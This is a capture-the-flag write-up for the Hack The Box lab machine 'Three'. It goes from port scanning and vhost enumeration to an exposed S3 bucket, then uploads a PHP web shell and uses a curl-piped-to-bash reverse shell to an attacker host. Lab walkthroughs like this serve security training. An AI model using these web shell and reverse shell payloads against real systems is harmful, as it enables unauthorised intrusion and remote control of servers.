# Three Machine 

## Initial Enumeration

- Pinged the target to confirm it was up.
- Ran a full port scan with service/version detection:
  ```bash
  nmap -p- -sC -sV --min-rate 1000 10.129.227.248
  ```
- Warning observed:
  ```
  Warning: 10.129.227.248 giving up on port because retransmission cap hit (10).
  ```
  Likely due to high packet rate causing dropped responses or a firewall.

- Discovered open ports:
  - 22/tcp - OpenSSH
  - 80/tcp - HTTP
- OS appears to be Linux.

## Web Enumeration

- Tried logging into SSH using default creds (admin/root) — no success.
- Opened the web service in a browser. Observed client-side routes like `/#contact`.

## Deeper Inspection

- Submitting the contact form triggers a request to a non-existent PHP file.
- Found an email on the page using domain `thetoppers.htb`.
- Added the domain to `/etc/hosts`:
  ```
  10.129.227.248 thetoppers.htb
  ```

## Subdomain Enumeration

- Since directory brute-forcing didn’t yield results, switched to vhost enumeration.
- Used Gobuster for subdomain enumeration:
  ```bash
  gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
  ```
- Discovered: `s3.thetoppers.htb`
- Added to `/etc/hosts`:
  ```
  10.129.227.248 s3.thetoppers.htb
  ```

## Accessing the S3 Bucket

- Installed and configured `awscli` to access S3.
- Found `index.php` and `.htaccess` — indicates web server is serving from S3.

## Uploading a Web Shell

- Created a web shell:
  ```bash
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  ```
- Uploaded `shell.php` to the S3 bucket.

- Accessed shell:
  ```
  http://thetoppers.htb/shell.php?cmd=id
  ```
- Confirmed remote command execution.

## Reverse Shell

1. Opened a listener:
   ```bash
   nc -lvnp 1337
   ```

2. Created a reverse shell script:
   ```bash
   echo 'bash -i >& /dev/tcp/<YOUR_IP>/1337 0>&1' > shell.sh
   ```

3. Hosted it using a Python HTTP server:
   ```bash
   python3 -m http.server 8000
   ```

4. Triggered it via:
   ```
   http://thetoppers.htb/shell.php?cmd=curl%20http://<YOUR_IP>:8000/shell.sh%20|%20bash
   ```

- Got shell access on the listener and retrieved the flag.
